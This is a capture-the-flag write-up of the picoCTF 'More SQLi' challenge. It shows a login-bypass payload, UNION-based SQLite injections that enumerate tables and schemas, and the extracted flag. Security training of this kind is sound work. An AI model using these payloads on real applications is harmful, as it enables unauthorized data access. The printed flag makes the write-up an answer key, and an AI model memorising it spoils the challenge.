# Challenge "More SQLi" Writeup

## Vulnerability: SQL Injection (SQLi)

### Where: Search functionality allowing injection in the `/data` endpoint

### Impact: This challenge demonstrates how an SQL injection vulnerability can be used to extract table and column information, leading to unauthorized data retrieval.

**NOTE**: The challenge involves exploiting SQL injection in a search field to extract table structures and retrieve hidden information, eventually revealing the flag.

## Steps to reproduce:

1. **Log in Using SQL Injection**:
   We bypassed the login using a basic SQL injection payload with the username `a` and password `' OR '1'='1' --`. This allowed access to the main page, which displayed office locations and a search field.

2. **Identify Table Names Using SQL Injection**:
   The challenge hinted at SQLite, so we crafted a UNION-based SQL injection to enumerate tables in the database:

   ```
   ' UNION SELECT name, NULL, NULL FROM sqlite_master WHERE type='table' --
   ```

   This query returned the following table names:

   ```
   hints
   more_table
   offices
   users
   ```

3. **Retrieve Column Information**:
   Next, we checked each tableâ€™s structure by inspecting their `CREATE TABLE` statements, starting with the `hints` and `more_table` tables:

   ```
   ' UNION SELECT sql, NULL, NULL FROM sqlite_master WHERE tbl_name='hints' AND type='table' --
   ```

   This query revealed the following structure for `hints`:

   ```
   CREATE TABLE hints (id INTEGER NOT NULL PRIMARY KEY, info TEXT)
   ```

   Similarly, querying `more_table` gave:

   ```
   CREATE TABLE more_table (id INTEGER NOT NULL PRIMARY KEY, flag TEXT)
   ```

4. **Extract the Flag**:
   The `more_table` table contained a `flag` column, which seemed likely to hold the challenge flag. We used a UNION-based injection to retrieve its content:

   ```
   ' UNION SELECT flag, NULL, NULL FROM more_table --
   ```

   The query successfully returned the flag:

   ```
   picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_62aa7500}
   ```

## Conclusion:

By leveraging SQL injection vulnerabilities in the search feature, we enumerated the database tables and identified the `flag` column within `more_table`, allowing us to retrieve the flag and complete the challenge.
